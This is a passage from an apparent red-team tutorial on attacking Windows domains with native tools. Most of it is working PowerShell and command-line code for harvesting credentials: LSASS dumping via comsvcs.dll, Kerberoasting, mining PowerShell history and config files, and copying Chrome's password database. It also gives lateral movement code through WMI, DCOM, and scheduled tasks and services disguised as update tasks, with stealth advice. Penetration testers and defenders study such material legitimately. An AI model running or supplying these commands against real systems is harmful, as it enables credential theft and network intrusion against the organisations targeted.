Get-ChildItem C:\Windows\Panther\ -Recurse -Include unattend.xml,autounattend.xml -ErrorAction SilentlyContinue

# Check for Group Policy Preferences files (can contain passwords)
Get-ChildItem C:\Windows\SYSVOL\ -Recurse -Include Groups.xml,Services.xml,Scheduledtasks.xml,DataSources.xml,Printers.xml,Drives.xml -ErrorAction SilentlyContinue

# Look for VNC server password files
Get-ChildItem C:\ -Recurse -Include ultravnc.ini,vnc.ini -ErrorAction SilentlyContinue

# Search for database connection strings
Get-ChildItem C:\inetpub\ -Recurse -Include web.config -ErrorAction SilentlyContinue |
    Select-String -Pattern "connectionString"

# Look for FileZilla saved credentials
Get-ChildItem C:\Users\*\AppData\Roaming\FileZilla\ -Include sitemanager.xml,recentservers.xml -ErrorAction SilentlyContinue
</code></pre>
<p>Let me explain why each of these is valuable:</p>
<p>Unattended installation files (unattend.xml) are used for automated Windows deployments. They often contain local administrator passwords in base64-encoded or even cleartext form. If your organization uses automated deployment, there's a good chance these files are still on systems.</p>
<p>Group Policy Preferences (GPP) files used to be a gold mine until Microsoft patched them. Prior to MS14-025, Group Policy could deploy local user accounts with passwords, and these passwords were encrypted with a published AES key. Even though Microsoft patched this, older environments might still have these files lying around with credentials.</p>
<p>VNC configuration files store passwords that are often weakly encrypted or in plaintext.</p>
<p>Web.config files for ASP.NET applications contain database connection strings, which include SQL Server credentials. These are often highly privileged accounts.</p>
<p>FileZilla, a popular FTP client, stores server credentials including passwords in XML files. If someone uses FileZilla to connect to servers, you get their FTP credentials.</p>
<h3>PowerShell History Mining</h3>
<p>PowerShell maintains a command history file, and administrators often type credentials directly into PowerShell commands when running scripts or making one-off connections. This history is stored in a plaintext file for each user.</p>
<pre class="language-powershell"><code class="language-powershell"># Get the PowerShell history path for current user
$historyPath = (Get-PSReadlineOption).HistorySavePath

# Read the history file
Get-Content $historyPath
</code></pre>
<p>In my experience, this has been successful more often than you might expect. I've found credentials for service accounts, SQL Server connections, remote systems, and even domain administrator accounts in PowerShell history.</p>
<p>To check all user history files on the system (requires admin):</p>
<pre class="language-powershell"><code class="language-powershell"># Search all users' PowerShell history
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue |
    ForEach-Object {
        Write-Output "`n=== History for $($_.FullName) ==="
        Get-Content $_.FullName | Select-String -Pattern "password|credential|username|pwd" -CaseSensitive:$false
    }
</code></pre>
<p>This searches every user's PowerShell history for lines containing credential-related keywords.</p>
<h3>Browser Credential Extraction</h3>
<p>Modern browsers store saved passwords, and while they're encrypted, the encryption keys are available to the user's account. With native tools, you can't easily decrypt browser passwords directly, but you can access the browser's credential storage.</p>
<p>For Chrome, passwords are stored in a SQLite database:</p>
<pre class="language-powershell"><code class="language-powershell"># Chrome password database location
$chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Copy the database (can't read it directly as Chrome locks it)
Copy-Item $chromePath C:\temp\ChromePasswords.db
</code></pre>
<p>You'd then need to exfiltrate this database and decrypt it offline. The decryption requires the user's DPAPI master key, which can be extracted with the LSASS dump we created earlier.</p>
<h3>Cached Domain Credentials</h3>
<p>Windows caches domain credentials to allow users to log in when domain controllers are unavailable. These are stored in the SECURITY registry hive and can be extracted:</p>
<pre class="language-powershell"><code class="language-powershell"># Extract the SECURITY hive (already covered this)
reg save HKLM\SECURITY C:\temp\security.hive
</code></pre>
<p>When you parse this with secretsdump or other tools, you'll get the cached credentials. These are salted and hashed, but if the passwords are weak, they can be cracked.</p>
<p>The format is different from NTLM hashes - they're MS Cache v2 hashes. You'd crack them with hashcat using mode 2100:</p>
<pre class="language-bash"><code class="language-bash">hashcat -m 2100 -a 0 hashes.txt wordlist.txt
</code></pre>
<h3>Credential Manager and DPAPI</h3>
<p>Windows Credential Manager stores saved credentials for network shares, RDP connections, and other applications. These credentials are protected by DPAPI (Data Protection API), which encrypts them using keys derived from the user's password.</p>
<p>To view what's in Credential Manager:</p>
<pre class="language-powershell"><code class="language-powershell"># List stored credentials
cmdkey /list
</code></pre>
<p>This shows you what credentials are saved, but not the actual passwords. To extract the passwords, you'd need to decrypt the DPAPI-protected credential files, which requires either the user's password or their DPAPI master key (which you can get from the LSASS dump).</p>
<p>The credential files are stored in:</p>
<pre class="language-powershell"><code class="language-powershell"># Credential Manager files location
Get-ChildItem C:\Users\*\AppData\Local\Microsoft\Credentials\ -ErrorAction SilentlyContinue
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Credentials\ -ErrorAction SilentlyContinue
</code></pre>
<h3>Kerberoasting: Extracting Service Account Credentials</h3>
<p>Kerberoasting is one of my favorite credential harvesting techniques because it's completely stealthy and can be done with nothing but native Windows tools. Let me explain what makes this technique so powerful.</p>
<p>In Active Directory environments, services that run under domain accounts (like SQL Server, IIS application pools, or custom services) need a way for clients to authenticate to them. This is handled through Service Principal Names (SPNs). When a user wants to access a service, their computer requests a service ticket (TGS - Ticket Granting Service ticket) from the domain controller. Here's the critical part: that service ticket is encrypted with the password hash of the service account.</p>
<p>What makes this exploitable is that any authenticated domain user can request a service ticket for any service in the domain. Once you have that ticket, you can take it offline and crack it at your leisure. The domain controller doesn't care who requests tickets or why - it's a normal part of Kerberos authentication. And since you're cracking the ticket offline, there's no account lockout risk. You can try billions of passwords without anyone knowing.</p>
<p>Let me walk you through the complete process using only native Windows tools.</p>
<p>First, we already covered finding accounts with SPNs in the enumeration section, but let me show you again with more context:</p>
<pre class="language-powershell"><code class="language-powershell"># Find all user accounts with SPNs registered
$searcher = [ADSISearcher]"(&#x26;(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))"
$searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","pwdlastset"))
$results = $searcher.FindAll()

foreach ($result in $results) {
    $username = $result.Properties['samaccountname'][0]
    $spn = $result.Properties['serviceprincipalname'][0]
    $pwdLastSet = [DateTime]::FromFileTime([Int64]$result.Properties['pwdlastset'][0])

    Write-Output "Username: $username"
    Write-Output "SPN: $spn"
    Write-Output "Password Last Set: $pwdLastSet"
    Write-Output "---"
}
</code></pre>
<p>This query returns all user accounts (not computer accounts) that have SPNs. The pwdlastset field is interesting because accounts with old passwords are more likely to have weak passwords that you can crack.</p>
<p>Now comes the actual Kerberoasting - requesting the service tickets. I'm going to use the built-in .NET Framework classes that are available on every Windows system:</p>
<pre class="language-powershell"><code class="language-powershell"># Request TGS tickets for all discovered SPNs
Add-Type -AssemblyName System.IdentityModel

foreach ($result in $results) {
    $spn = $result.Properties['serviceprincipalname'][0]
    $username = $result.Properties['samaccountname'][0]

    try {
        Write-Output "[*] Requesting ticket for $spn ($username)"
        $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
        Write-Output "[+] Ticket requested successfully"
    }
    catch {
        Write-Output "[-] Failed to request ticket: $($_.Exception.Message)"
    }
}
</code></pre>
<p>This code loads the System.IdentityModel assembly (built into .NET Framework) and uses the KerberosRequestorSecurityToken class to request service tickets. This is exactly what happens when legitimate applications access Kerberos-authenticated services - we're just doing it manually.</p>
<p>After running this, the tickets are cached in memory. You can verify they're there using the built-in klist command:</p>
<pre class="language-powershell"><code class="language-powershell"># List all cached Kerberos tickets
klist
</code></pre>
<p>You'll see output like:</p>
<pre class="language-none"><code class="language-none">#0>     Client: user @ DOMAIN.LOCAL
        Server: MSSQLSvc/sql01.domain.local:1433 @ DOMAIN.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 11/28/2025 10:30:45
        End Time:   11/28/2025 20:30:45
        Renew Time: 12/5/2025 10:30:45
</code></pre>
<p>The encryption type is important - older accounts might use RC4-HMAC, which is weaker and faster to crack. Modern accounts use AES-256, which is much stronger.</p>
<p>Now we need to extract these tickets so we can crack them offline. This is where it gets a bit tricky with only native tools. The tickets are stored in LSASS memory, and we need to export them in a format that cracking tools understand.</p>
<p>The most straightforward way with native tools is to use Mimikatz's functionality, but since we're trying to stay native, we can export them through the LSASS dump we already created earlier:</p>
<pre class="language-powershell"><code class="language-powershell"># If you haven't already dumped LSASS, do it now
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\temp\lsass.dmp full
</code></pre>
<p>Then on your attacker machine, you can extract the Kerberos tickets from the LSASS dump using pypykatz:</p>
<pre class="language-bash"><code class="language-bash"># On your attacker machine
pypykatz lsa minidump lsass.dmp -k kerberos_tickets
</code></pre>
<p>This extracts the tickets in a format you can crack with hashcat or John the Ripper.</p>
<p>Alternatively, if you want to export tickets in a more targeted way, you can use PowerShell to access the Windows API directly. Here's a more advanced technique that extracts the ticket in Kirbi format (which can be converted to crackable format):</p>
<pre class="language-powershell"><code class="language-powershell"># This requires more complex P/Invoke code, but here's the concept
# Note: This is significantly more complex and typically requires additional tooling
# Most practitioners use the LSASS dump method above

# Export tickets using klist
klist tickets > C:\temp\tickets.txt
</code></pre>
<p>The <code>klist</code> output isn't directly crackable, but it shows you what tickets you have. To actually crack them, you need the raw ticket data from LSASS.</p>
<p>Once you have the tickets extracted on your attacking machine, crack them with hashcat:</p>
<pre class="language-bash"><code class="language-bash"># Crack the extracted tickets
# Mode 13100 for Kerberos 5 TGS-REP (AES256)
# Mode 19700 for Kerberos 5 TGS-REP (AES128)
# Mode 18200 for Kerberos 5 AS-REP etype 23

hashcat -m 13100 -a 0 tickets.txt /path/to/wordlist.txt
</code></pre>
<p>If you successfully crack the password, you now have valid credentials for that service account. Service accounts often have elevated privileges - SQL Server service accounts frequently have sysadmin rights on the database server, and some service accounts are even members of Domain Admins.</p>
<p>One more advanced technique - if you have GenericWrite, GenericAll, or WriteDacl permissions on a user account, you can set an SPN on that account yourself, then Kerberoast it. This is useful when there aren't many existing SPNs in the environment:</p>
<pre class="language-powershell"><code class="language-powershell"># Set an SPN on an account you have write access to
# This requires the ActiveDirectory module or direct LDAP manipulation
Set-ADUser -Identity targetuser -ServicePrincipalNames @{Add="HTTP/fake.domain.local"}

# Request ticket for the SPN you just added
$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/fake.domain.local"

# After extracting and cracking, clean up
Set-ADUser -Identity targetuser -ServicePrincipalNames @{Remove="HTTP/fake.domain.local"}
</code></pre>
<p>This technique is called "Targeted Kerberoasting" and is particularly useful when the user you have control over has a weak password but doesn't have an SPN by default.</p>
<h2>Lateral Movement Techniques</h2>
<p>Once you have credentials - whether from LSASS dumps, registry extraction, or file searches - it's time to move laterally through the network. Lateral movement is how you go from that initial foothold on one workstation to controlling multiple systems and ultimately reaching your objectives.</p>
<p>The key to successful lateral movement is blending in with normal network traffic. Administrators move between systems all the time using legitimate tools and protocols. If you use those same tools and protocols, your activity looks like normal IT operations.</p>
<h3>PowerShell Remoting: The Modern Way</h3>
<blockquote>
<p><strong>üö® EDR REALITY CHECK (2025):</strong> WMI remote execution and Invoke-Command are increasingly monitored in restricted corporate environments with mature security programs. While these techniques are legitimate admin tools (which is why they're not universally blocked), behavioral analytics now flag unusual patterns: connections from non-admin accounts, connections outside business hours, rapid sequential connections to multiple hosts, or connections from unexpected source systems. These are still more stealthy than PsExec or other third-party tools, but they're not invisible. Advanced monitoring solutions log WinRM activity and PowerShell Remoting sessions for forensic analysis.</p>
</blockquote>
<p>PowerShell Remoting is the modern standard for Windows system administration. It replaced older tools like PsExec and telnet for remote management. In any well-managed Windows environment, PowerShell Remoting is enabled on servers and increasingly on workstations.</p>
<p>PowerShell Remoting uses WinRM (Windows Remote Management) protocol, which runs over HTTP/HTTPS on ports 5985/5986. The traffic is encrypted, and from a network monitoring perspective, it looks like legitimate remote administration.</p>
<p>Let me show you how I use PowerShell Remoting for lateral movement:</p>
<p>First, check if a target system has PowerShell Remoting enabled:</p>
<pre class="language-powershell"><code class="language-powershell"># Test if WinRM is accessible on the target
Test-WSMan -ComputerName TARGET-PC
</code></pre>
<p>If this returns system information, PowerShell Remoting is available. If it fails, the system either doesn't have WinRM enabled, it's blocked by a firewall, or you don't have permission to connect.</p>
<p>For an interactive session on the remote system:</p>
<pre class="language-powershell"><code class="language-powershell"># Start an interactive PowerShell session on remote system
Enter-PSSession -ComputerName TARGET-PC -Credential (Get-Credential)
</code></pre>
<p>This prompts you for credentials and then drops you into a PowerShell session on the remote system. Anything you type is executed on the target. Your prompt changes to indicate you're in a remote session:</p>
<pre class="language-none"><code class="language-none">[TARGET-PC]: PS C:\Users\admin\Documents>
</code></pre>
<p>This is useful for interactive exploration, but in a real engagement, interactive sessions create longer-lived connections that are more likely to be noticed. I prefer one-off command execution:</p>
<pre class="language-powershell"><code class="language-powershell"># Execute a single command remotely
Invoke-Command -ComputerName TARGET-PC -ScriptBlock { whoami }
</code></pre>
<p>The ScriptBlock contains the PowerShell code you want to execute. This could be a single command like <code>whoami</code> or a complex script. The command executes, returns the output, and closes the connection immediately.</p>
<p>For better OPSEC, you want to avoid entering credentials interactively because it might trigger logging or prompts. If you have credentials (maybe from a previous compromise), create a credential object:</p>
<pre class="language-powershell"><code class="language-powershell"># Create a credential object
$password = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("DOMAIN\username", $password)

# Use the credential object
Invoke-Command -ComputerName TARGET-PC -Credential $cred -ScriptBlock {
    # Your code here
    Get-Process
}
</code></pre>
<p>One of the most powerful aspects of PowerShell Remoting is that you can target multiple systems simultaneously:</p>
<pre class="language-powershell"><code class="language-powershell"># Execute command on multiple systems
$targets = @("TARGET-PC1", "TARGET-PC2", "TARGET-PC3")
Invoke-Command -ComputerName $targets -Credential $cred -ScriptBlock {
    Get-LocalGroupMember -Group "Administrators"
}
</code></pre>
<p>This runs the command on all three systems in parallel and returns the results. The output includes a PSComputerName property so you know which system each result came from.</p>
<p>You can also run local scripts on remote systems:</p>
<pre class="language-powershell"><code class="language-powershell"># Execute a local script file on remote systems
Invoke-Command -ComputerName TARGET-PC -FilePath C:\scripts\enumeration.ps1
</code></pre>
<p>This reads the local script file, sends it to the remote system, and executes it there. The script never touches disk on the remote system - it executes entirely in memory.</p>
<p>A few important considerations about PowerShell Remoting:</p>
<p>First, it requires the target system to have WinRM enabled and configured. On servers (Windows Server 2012 and later), it's enabled by default. On workstations, it usually needs to be manually enabled or enabled via Group Policy.</p>
<p>Second, it creates Windows Event Log entries on both the source and target systems. Event ID 4624 (successful logon) with logon type 3 (network) and Event ID 4648 (explicit credential use) are created. On the target, WinRM logs (Microsoft-Windows-WinRM/Operational) record the connection.</p>
<p>Third, there's the "double-hop" problem. When you connect to System A using credentials, and then try to access System B from System A, it fails because your credentials aren't passed along. This is by design for security, but it complicates lateral movement chains. The solution is CredSSP, but enabling it can be complex and requires configuration changes.</p>
<h3>Using Harvested Credentials: Pass-the-Hash and Beyond</h3>
<p>Now that we've harvested credentials through various methods, let's talk about how to actually use them for lateral movement. This is where many people get confused because there are several different techniques depending on what kind of credentials you've obtained.</p>
<p>Let me clarify something important: true "pass-the-hash" (using only an NTLM hash without knowing the cleartext password) is actually very difficult with only native Windows tools. The Windows authentication architecture doesn't natively support authenticating with just a hash - it expects either cleartext passwords or Kerberos tickets. Tools like Mimikatz and Impacket work around this by injecting the hash into LSASS or by implementing the NTLM authentication protocol themselves.</p>
<p>However, we can accomplish similar results using native Windows tools through several techniques. Let me walk you through the options based on what credentials you've obtained.</p>
<h4>Option 1: Using Cleartext Passwords</h4>
<p>If you've successfully cracked hashes or found cleartext passwords (in files, PowerShell history, etc.), using them is straightforward. You create a PSCredential object and use it with PowerShell Remoting or WMI:</p>
<pre class="language-powershell"><code class="language-powershell"># Create a credential object with cleartext password
$password = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("DOMAIN\username", $password)

# Use it for PowerShell Remoting
Invoke-Command -ComputerName TARGET-PC -Credential $cred -ScriptBlock {
    whoami
    hostname
}

# Or with WMI
$options = New-Object System.Management.ConnectionOptions
$options.Username = "DOMAIN\username"
$options.Password = "P@ssw0rd123"
$scope = New-Object System.Management.ManagementScope("\\TARGET-PC\root\cimv2", $options)
$scope.Connect()

# Now you can query WMI or execute commands
</code></pre>
<p>This is completely native and works reliably. The downside is you need the cleartext password.</p>
<h4>Option 2: Pass-the-Ticket (Using Kerberos Tickets)</h4>
<p>This is a native technique that works without any additional tools. If you've extracted Kerberos tickets from LSASS (either TGTs or service tickets), you can import them into your current session and use them for authentication.</p>
<p>The challenge is that with only native tools, importing tickets is difficult. The tickets are stored in LSASS, and there's no native Windows command to import a ticket file. However, if you've extracted a ticket from one user session, you can use it in another session on the same machine:</p>
<pre class="language-powershell"><code class="language-powershell"># List current tickets
klist

# Purge current tickets (optional - be careful with this)
klist purge

# Unfortunately, there's no native "klist import" command
# Tickets can be imported programmatically using Windows APIs, but this requires
# P/Invoke code or additional tools like Rubeus
</code></pre>
<p>The reality is that true pass-the-ticket with only native tools is limited. You can work with tickets that are already in memory, but importing external tickets requires Windows API calls that aren't exposed through PowerShell cmdlets.</p>
<h4>Option 3: Overpass-the-Hash (Pass-the-Key)</h4>
<p>Here's a more practical native technique. If you have an NTLM hash, you can use it to request a Kerberos TGT (Ticket Granting Ticket), then use that TGT for authentication. This is called "overpass-the-hash" or "pass-the-key."</p>
<p>The tricky part is that requesting a TGT with just a hash requires direct manipulation of Windows authentication APIs. With only native PowerShell, this is very difficult. However, I can show you the concept:</p>
<pre class="language-powershell"><code class="language-powershell"># This is the theory - actual implementation requires complex P/Invoke code
# The steps would be:
# 1. Use the NTLM hash to compute a Kerberos key
# 2. Use that key to request a TGT from the domain controller
# 3. Import the TGT into the current session
# 4. Use the TGT for authentication

# In practice, this is what Rubeus does with the "asktgt" command
# Native implementation would require:
# - P/Invoke calls to LsaLogonUser or similar APIs
# - Manual Kerberos AS-REQ construction
# - Crypto operations to compute the Kerberos key from NTLM hash

# This is beyond what's practical with "native tools only"
</code></pre>
<p>The honest truth is that true pass-the-hash and overpass-the-hash are difficult without tools like Mimikatz or Rubeus. These tools exist specifically because Windows doesn't natively expose these capabilities.</p>
<h4>Option 4: The Practical Native Approach</h4>
<p>Here's what I actually do in engagements when restricted to native tools. After dumping LSASS and extracting credentials, I:</p>
<ol>
<li><strong>Crack the NTLM hashes offline</strong> (using hashcat) to get cleartext passwords</li>
<li><strong>Use the cleartext passwords</strong> with PSCredential objects</li>
<li><strong>Leverage existing Kerberos tickets</strong> on compromised systems without exporting them</li>
</ol>
<p>Let me show you the third option in detail, because it's very powerful and completely native:</p>
<pre class="language-powershell"><code class="language-powershell"># Scenario: You've compromised a system where a domain admin is logged in
# Their Kerberos tickets are already in memory

# Check what tickets are available
klist

# If you see a TGT for a privileged account, you can use it without doing anything!
# The ticket is already active in the session

# Now, from this same session, use PowerShell Remoting to a target
Enter-PSSession -ComputerName DC01

# You're now authenticated as the domain admin whose TGT is in memory
# This works because the system automatically uses available Kerberos tickets
</code></pre>
<p>This is incredibly powerful. If you've compromised a system where privileged users are logged in (or have recently logged in and their tickets haven't expired), you can piggyback on their existing Kerberos authentication without needing to export, import, or manipulate tickets at all.</p>
<p>Another practical approach is using <code>runas</code> with the <code>/netonly</code> flag:</p>
<pre class="language-powershell"><code class="language-powershell"># This doesn't truly pass-the-hash, but it lets you create a process with alternate network credentials
# The credentials must be valid (you can't use just a hash here)
runas /netonly /user:DOMAIN\admin "powershell.exe"

# This spawns a new PowerShell process
# Any network authentication from this process will use the specified credentials
# But the local process runs under your current user context
</code></pre>
<p>When you run commands in this new PowerShell window, network operations (like accessing file shares, WMI, PowerShell Remoting) will use the credentials you specified.</p>
<h4>Option 5: Using NTLM Hashes with WMI (Workaround)</h4>
<p>Here's a creative workaround. While you can't directly use NTLM hashes with native PowerShell, you can use the fact that some Windows APIs accept NTLM authentication directly. However, this still ultimately requires the cleartext password for the API call:</p>
<pre class="language-powershell"><code class="language-powershell"># This still needs cleartext, but shows how authentication works
$username = "DOMAIN\user"
$password = "P@ssw0rd123"

# Create WMI connection with explicit credentials
$options = New-Object System.Management.ConnectionOptions
$options.Username = $username
$options.Password = $password
$options.Impersonation = [System.Management.ImpersonationLevel]::Impersonate
$options.Authentication = [System.Management.AuthenticationLevel]::PacketPrivacy

$scope = New-Object System.Management.ManagementScope("\\TARGET-PC\root\cimv2", $options)
$scope.Connect()

# Execute WMI query
$query = New-Object System.Management.ObjectQuery("SELECT * FROM Win32_Process")
$searcher = New-Object System.Management.ManagementObjectSearcher($scope, $query)
$processes = $searcher.Get()
</code></pre>
<p>The reality is that with native tools only, your best approach for lateral movement is:</p>
<ol>
<li>Extract credentials (LSASS dumps, registry, files)</li>
<li>Crack NTLM hashes offline to get cleartext passwords (or use Kerberos tickets you've extracted)</li>
<li>Use cleartext passwords with PSCredential objects for PowerShell Remoting and WMI</li>
<li>Leverage existing Kerberos tickets on compromised systems without exporting them</li>
</ol>
<p>This is why tools like Mimikatz and Rubeus exist - they fill the gaps that native Windows tools don't cover for offensive operations. But with creativity and patience, you can accomplish most lateral movement goals with native tools by focusing on credential extraction and cracking rather than trying to use hashes directly.</p>
<h3>WMI: The Old Reliable</h3>
<p>WMI (Windows Management Instrumentation) has been around since Windows NT, and it's still incredibly useful for lateral movement. Every Windows system has WMI, it's enabled by default, and it's a completely legitimate management protocol.</p>
<p>The key advantage of WMI over PowerShell Remoting is that it works on older systems and doesn't require any special configuration. If you have admin credentials for a system, you can use WMI to interact with it.</p>
<p>Here's how to execute commands remotely using WMI:</p>
<pre class="language-powershell"><code class="language-powershell"># Execute a command on a remote system using WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\output.txt" -ComputerName TARGET-PC
</code></pre>
<p>Let me break down what's happening here. We're calling the Create method of the Win32_Process WMI class, which creates a new process. The ArgumentList is the command we want to run. This executes on the remote system as SYSTEM or as the user account that WMI is running under.</p>
<p>The challenge with WMI is that you don't get output directly - the command executes, but you can't see what it returned. That's why in the example above, I redirected output to a file. To get that output, I need to read the file:</p>
<pre class="language-powershell"><code class="language-powershell"># Read the output file
$output = Get-Content \\TARGET-PC\C$\temp\output.txt

# Display the output
$output

# Clean up the file
Remove-Item \\TARGET-PC\C$\temp\output.txt
</code></pre>
<p>The <code>\\TARGET-PC\C$</code> notation accesses the administrative share on the remote system, which is available if you have admin credentials.</p>
<p>For a more elegant approach, you can use WMI to execute PowerShell, which can then return output directly:</p>
<pre class="language-powershell"><code class="language-powershell"># Execute PowerShell command via WMI
$command = "Get-Process | ConvertTo-Json"
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))

Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -EncodedCommand $encodedCommand -NoProfile" -ComputerName TARGET-PC
</code></pre>
<p>WMI can also be used to query remote systems for information without executing commands:</p>
<pre class="language-powershell"><code class="language-powershell"># Get OS information from remote system
Get-WmiObject -Class Win32_OperatingSystem -ComputerName TARGET-PC

# Get running processes
Get-WmiObject -Class Win32_Process -ComputerName TARGET-PC

# Get installed hotfixes
Get-WmiObject -Class Win32_QuickFixEngineering -ComputerName TARGET-PC
</code></pre>
<p>These queries are completely passive from the remote system's perspective - you're just reading information, not executing anything.</p>
<p>One more powerful WMI technique is using wmic.exe, the command-line interface to WMI:</p>
<pre class="language-batch"><code class="language-batch">wmic /node:TARGET-PC process call create "cmd.exe /c whoami"
</code></pre>
<p>This does the same thing as Invoke-WmiMethod but from cmd.exe instead of PowerShell. Sometimes this is useful if you're working from a basic shell without PowerShell access.</p>
<p>Important note about WMI: It uses DCOM (Distributed COM) for communication, which means it uses dynamic RPC ports (typically in the range 49152-65535). Firewalls might block these ports between network segments. It also creates event log entries - Event ID 4624 with logon type 3 for the network authentication.</p>
<h3>DCOM: The Stealthy Alternative</h3>
<p>DCOM (Distributed Component Object Model) is less commonly used than WMI or PowerShell Remoting, which actually makes it more interesting for red teaming. Security tools are less likely to specifically monitor for DCOM abuse, and it's not typically discussed in defensive training.</p>
<p>DCOM allows you to instantiate COM objects on remote systems and call their methods. Certain COM objects can be abused to execute commands remotely. Let me show you the most reliable techniques:</p>
<pre class="language-powershell"><code class="language-powershell"># Method 1: MMC20.Application
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET-PC"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
</code></pre>
<p>This uses the MMC20.Application COM object, which is the Microsoft Management Console's automation interface. The ExecuteShellCommand method does exactly what it sounds like - executes a shell command with the command "cmd.exe", directory set to $null (using the default), parameters "/c calc.exe", and window state "7" (hidden window).</p>
<pre class="language-powershell"><code class="language-powershell"># Method 2: ShellWindows
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","TARGET-PC"))
$item = $dcom.Item()
$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
</code></pre>
<p>ShellWindows represents Windows Explorer windows. Each Explorer window has a Document.Application object that exposes a ShellExecute method with the file "cmd.exe", arguments "/c calc.exe", directory "C:\Windows\System32", operation set to $null (default, which means "open"), and show value 0 (hidden).</p>
<pre class="language-powershell"><code class="language-powershell"># Method 3: ShellBrowserWindow
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","TARGET-PC"))
$item = $dcom.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
</code></pre>
<p>ShellBrowserWindow is similar to ShellWindows and uses the same ShellExecute method.</p>
<p>The advantages of DCOM are that it's less commonly monitored than WMI or PowerShell Remoting, it uses standard RPC/DCOM ports (135 plus dynamic ports), it doesn't require WinRM to be enabled, and it works on older Windows systems that might not have PowerShell Remoting configured.</p>
<p>The disadvantages are that you don't get command output (similar to WMI), it requires admin credentials, the COM objects might not be available on all systems, and some EDR solutions now monitor DCOM abuse after it became publicly known in the security community.</p>
<h3>Scheduled Tasks for Remote Execution</h3>
<p>Creating scheduled tasks on remote systems is a completely legitimate administrative action that's perfect for lateral movement:</p>
<pre class="language-batch"><code class="language-batch">schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c whoami > C:\temp\output.txt" /sc once /st 00:00 /S TARGET-PC /U DOMAIN\username /P password
</code></pre>
<p>Let me break down this command. The <code>/create</code> flag creates a new task, while <code>/tn "WindowsUpdate"</code> sets the task name disguised as a legitimate update task. The <code>/tr "cmd.exe /c..."</code> parameter specifies the command to run. We use <code>/sc once</code> to set it as a one-time task with <code>/st 00:00</code> as the start time (midnight, though we'll run it immediately). The <code>/S TARGET-PC</code> targets the remote system, and <code>/U DOMAIN\username</code> and <code>/P password</code> provide the credentials for authentication.</p>
<p>After creating the task, run it immediately:</p>
<pre class="language-batch"><code class="language-batch">schtasks /run /tn "WindowsUpdate" /S TARGET-PC /U DOMAIN\username /P password
</code></pre>
<p>Then clean up:</p>
<pre class="language-batch"><code class="language-batch">schtasks /delete /tn "WindowsUpdate" /S TARGET-PC /U DOMAIN\username /P password /F
</code></pre>
<p>The <code>/F</code> flag forces deletion without confirmation.</p>
<p>For better OPSEC, you can configure the task to run as SYSTEM:</p>
<pre class="language-batch"><code class="language-batch">schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c your_command" /sc once /st 00:00 /ru SYSTEM /S TARGET-PC /U DOMAIN\username /P password
</code></pre>
<p>The <code>/ru SYSTEM</code> flag makes the task run as SYSTEM, giving you the highest privileges on the target system.</p>
<p>You can also create more sophisticated tasks using PowerShell:</p>
<pre class="language-powershell"><code class="language-powershell"># Create a scheduled task using PowerShell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -Command Get-Process"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName "SystemMaintenance" -Action $action -Trigger $trigger -Principal $principal -CimSession TARGET-PC
</code></pre>
<p>This creates a task that will run one minute from now as SYSTEM. The <code>-CimSession</code> parameter allows you to target a remote system.</p>
<p>Scheduled tasks are logged in the Task Scheduler event logs (Event ID 106 for task registered, 200 for task executed), but they're so common in enterprise environments that they rarely trigger alerts unless the task name or command is obviously suspicious.</p>
<h3>Service-Based Lateral Movement</h3>
<p>Windows services are another legitimate mechanism for executing code that can be abused for lateral movement:</p>
<pre class="language-batch"><code class="language-batch"># Create a service on the remote system
sc.exe \\TARGET-PC create UpdateService binPath= "cmd.exe /c whoami > C:\temp\output.txt" start= demand
</code></pre>
<p>Note the spaces after <code>binPath=</code> and <code>start=</code> - they're required for sc.exe to parse the command correctly.</p>
<p>Start the service:</p>
<pre class="language-batch"><code class="language-batch">sc.exe \\TARGET-PC start UpdateService
</code></pre>
<p>When the service starts, it executes the command specified in binPath. Services run as SYSTEM by default unless you specify otherwise.</p>
<p>Clean up:</p>
<pre class="language-batch"><code class="language-batch">sc.exe \\TARGET-PC delete UpdateService
</code></pre>
<p>The limitation of this technique is that the command needs to behave like a service - it needs to respond to service control messages. A simple command like <code>cmd.exe /c whoami</code> won't work properly as a service because it doesn't implement the Service Control Manager interface. The command will execute, but you'll get an error that the service didn't start properly.</p>
<p>To work around this, you can use a service-friendly executable or wrap your command:</p>
